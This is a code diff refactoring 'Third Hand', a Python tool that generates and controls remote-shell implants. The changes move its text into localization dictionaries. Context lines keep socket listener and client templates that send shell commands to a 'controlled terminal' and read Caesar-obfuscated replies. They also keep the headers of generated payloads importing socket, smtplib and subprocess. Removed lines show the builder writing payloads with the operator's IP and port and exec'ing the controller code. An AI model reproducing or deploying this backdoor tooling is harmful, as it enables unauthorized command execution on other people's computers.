@@ -1,18 +1,74 @@
-# coding=utf-8
-import socket
+LOGO_STR = """
+     _____ _     _         _   _   _                 _ 
+    |_   _| |__ (_)_ __ __| | | | | | __ _ _ __   __| |
+      | | | '_ \| | '__/ _` | | |_| |/ _` | '_ \ / _` |
+      | | | | | | | | | (_| | |  _  | (_| | | | | (_| |
+      |_| |_| |_|_|_|  \__,_| |_| |_|\__,_|_| |_|\__,_|
+                                                
+                                                V 1.0
+    """
 
-def Caesar(i,string1):
-    string2 = ''
-    if i == 0:
-        for a in string1:string2 = string2 + chr(ord(a)+4)
-    elif i == 1:
-        for a in string1:string2 = string2 + chr(ord(a)-4)
-    return string2
-a1 = """
+STRINGS = {
+    "zh_CN": {
+        "str_help_for_help": "显示帮助信息",
+        "str_help_for_create": "生成被控端脚本",
+        "str_help_for_connect": "连接被控端脚本",
+        "str_help_for_exit": "退出",
+        "str_mode_description": "模式有 1 与 2 两种\n1 —— 反向连接\n2 —— 正向连接",
+        "str_input_host_addr": "请输入本机的IP：",
+        "str_input_host_port": "请输入一个端口号：",
+        "str_input_others_addr": "请输入被控端的IP：",
+        "str_input_others_port": "请输入被控端的端口：",
+        "str_arg_not_found": "%s没有该参数：%s",
+        "str_command_not_found": "%s没有此命令：%s",
+        "str_listening": "正在监听此端口",
+        "str_word_mode": "模式",
+        "str_word_path": "路径",
+        "str_arg_not_enough": "提供给%s命令的参数个数不足：预期%d个，实际%d个",
+    },
+    "en_US": {
+        "str_help_for_help": "Display help message",
+        "str_help_for_create": "Generate controlled terminal's script",
+        "str_help_for_connect": "Connect to the controlled terminal",
+        "str_help_for_exit": "Exit the program",
+        "str_mode_description": "Mode has two kinds, 1 and 2, which \n1 —— Reversed Connection\n2 —— Normal Connection",
+        "str_input_host_addr": "Input host's IP Address: ",
+        "str_input_host_port": "Input a port number: ",
+        "str_input_others_addr": "Input the controlled terminal's IP address: ",
+        "str_input_others_port": "Input the controlled terminal's port number: ",
+        "str_arg_not_found": "%s doesn't accept this argument: %s",
+        "str_command_not_found": "%s doesn't have this command: %s",
+        "str_listening": "Listening to the port...",
+        "str_word_mode": "Mode",
+        "str_word_path": "Path",
+        "str_arg_not_enough": "Not enough arguments for command %s : Expected %d, actually %d",
+    },
+    "ja_JP": {
+        "str_help_for_help": "ヘルプを出力します",
+        "str_help_for_create": "制御された一端のスクリプトを作成します",
+        "str_help_for_connect": "制御された一端を接続します",
+        "str_help_for_exit": "このプログラムが終了します",
+        "str_mode_description": "モードは２種類があります。 \n1 —— 逆方向接続\n2 —— 順方向接続",
+        "str_input_host_addr": "ホストのIPが入力してください：",
+        "str_input_host_port": "ポート番号が１つ入力してください：",
+        "str_input_others_addr": "制御された一端のIPが入力してください：",
+        "str_input_others_port": "制御された一端のポート番号が入力してください",
+        "str_arg_not_found": "%sはこのパラメータがありません：%s",
+        "str_command_not_found": "%sはこのコマンドがありません：%s",
+        "str_listening": "ポートをリスニングしています…",
+        "str_word_mode": "モード",
+        "str_word_path": "パス",
+        "str_arg_not_enough": "コマンド%sに十分なパラメータが指定されていません：予期%d、実際%d",
+    },
+}
+
+SUPPORTED_LANGUAGES = list(STRINGS.keys())
+
+CODE_SLICE_0 = """
 t = socket.socket()
 t.bind(("",%s))
 t.listen(1)
-print("正在监听此端口")
+print("%s")
 c,ip = t.accept()
 while True:
     cmd = input('$>')
@@ -23,7 +79,7 @@ while True:
 c.close()
 t.close()
 """
-a2 = """
+CODE_SLICE_1 = """
 t = socket.socket()
 t.connect(("%s",%s))
 while True:
@@ -34,7 +90,8 @@ while True:
         print(Caesar(1,t.recv(2048).decode("gbk")))
 t.close()
 """
-b1 = """
+
+CODE_SLICE_2 = """
 # coding=utf-8
 import socket,smtplib,subprocess
 from os import remove
@@ -97,7 +154,7 @@ if "__main__" == __name__:
     except:
         exit()
 """
-b2 = """
+CODE_SLICE_3 = """
 # coding=utf-8
 import socket,smtplib,subprocess
 from os import remove
@@ -161,56 +218,10 @@ if "__main__" == __name__:
     t.close()
 """
 
-if "__main__" == __name__:
-    print("""
-     _____ _     _         _   _   _                 _ 
-    |_   _| |__ (_)_ __ __| | | | | | __ _ _ __   __| |
-      | | | '_ \| | '__/ _` | | |_| |/ _` | '_ \ / _` |
-      | | | | | | | | | (_| | |  _  | (_| | | | | (_| |
-      |_| |_| |_|_|_|  \__,_| |_| |_|\__,_|_| |_|\__,_|
-                                                
-                                                V 1.0
-    """)
-    while True:
-        cmd = input("Third-Hand $>").split()
-        if cmd[0] == "help":
-            print("""
-            help                   显示帮助信息
-            create [模式] [路径]    生成被控端脚本
-            connect [模式]         连接被控端脚本
-            exit                   退出
+MAIN_PROMPT = "Third-Hand $"
 
-            模式有 1 与 2 两种
-            1 —— 反向连接
-            2 —— 正向连接
-            """) 
-        elif cmd[0] == "create":
-            if cmd[1] == "1":
-                file = open(cmd[2],"w+")
-                file.write(b1 % (input("本机的IP>"),input("本机的某个port>")))
-                file.close()
-            elif cmd[1] == "2":
-                file = open(cmd[2],"w+")
-                file.write(b2 % (input("被控端的某个port>")))
-                file.close()
-            else:
-                print("create无%s此参数" % cmd[1])
-        elif cmd[0] == "connect":
-            if cmd[1] == "1":
-                exec(a1 % input("本机的某个port(与被控端相同)>"))
-            elif cmd[1] == "2":
-                exec(a2 % (input("被控端的IP>"),input("被控端的port>")))
-            else:
-                print("connecet无%s此参数" % cmd[1])
-        elif cmd[0] == "exit":
-            print("""
-                ____                   _                
-               / ___| ___   ___   __ _| |__  _   _  ___ 
-              | |  _ / _ \ / _ \ / _` | '_ \| | | |/ _ |
-              | |_| | (_) | (_) | (_| | |_) | |_| |  __/
-               \____|\___/ \___/ \__, |_.__/ \__, |\___|
-                                 |___/       |___/      
-            """)
-            exit()
-        else:
-            print("Third Hand无%s此命令" % cmd[0])
+PROMPT_CHARACTER = "> "
+
+# Functions
+def gp(s):
+    return s + PROMPT_CHARACTER
